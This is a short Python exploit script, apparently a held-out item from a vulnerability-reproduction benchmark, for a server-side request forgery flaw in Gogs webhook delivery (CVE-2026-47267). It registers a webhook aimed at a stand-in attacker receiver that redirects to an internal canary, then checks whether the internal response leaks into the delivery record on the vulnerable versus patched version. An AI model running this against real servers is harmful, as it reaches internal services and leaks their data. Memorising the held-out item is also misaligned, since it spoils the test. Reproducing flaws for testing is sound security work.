#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-47267 residual exploit for gogs-cve-2026-47267.

The webhook payload URL points at an attacker-controlled receiver (attacker:
8000), which is exempted via [security] LOCAL_NETWORK_ALLOWLIST (legitimate
trusted SaaS receiver). The receiver answers every delivery with a 302 to the
internal canary. On v1 (0.14.2) Gogs webhook delivery follows redirects without
re-validating the target, so the internal canary is reached and its flag
response shows up in the delivery record. On v2 (0.14.3) redirects are refused
("refusing to follow webhook redirect"), so no internal response is recorded.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import gogs_util as gu  # noqa: E402

ATTACKER_URL = "http://attacker:8000/cb"


def candidate(*, version="v1", flag=None):
    token = gu.create_token(version)
    try:
        hook_id = gu.create_webhook_api(version, token, ATTACKER_URL)
    except Exception as e:
        return {"ok": False, "error": f"create hook: {e}"}
    gu.trigger_test_delivery(version, hook_id)
    body = gu.read_hook_delivery_body(version, hook_id)
    return {"ok": flag in body if flag else bool(body), "delivery_body": body[:400]}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
